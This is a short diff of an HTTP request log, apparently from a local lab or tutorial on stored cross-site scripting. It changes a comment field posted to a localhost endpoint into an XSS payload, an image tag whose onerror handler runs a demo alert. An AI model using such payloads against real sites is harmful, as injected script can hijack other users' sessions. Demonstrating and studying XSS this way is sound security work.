@@ -85,7 +85,7 @@ Response code: 200; Time: 213ms; Content length: 586 bytes
 POST http://localhost:8080/xss/stored/posts/3/comments
 Content-Type: application/json
 
-{"comment": "alert('Yalco')", "userId": 9, "userNames": "Fake faking", "userProfilePicture": "fake"}
+{"comment": "<img src=1 onerror=alert('Yalco XSS')>", "userId": 9, "userNames": "Fake faking", "userProfilePicture": "fake"}
 
 
 HTTP/1.1 200
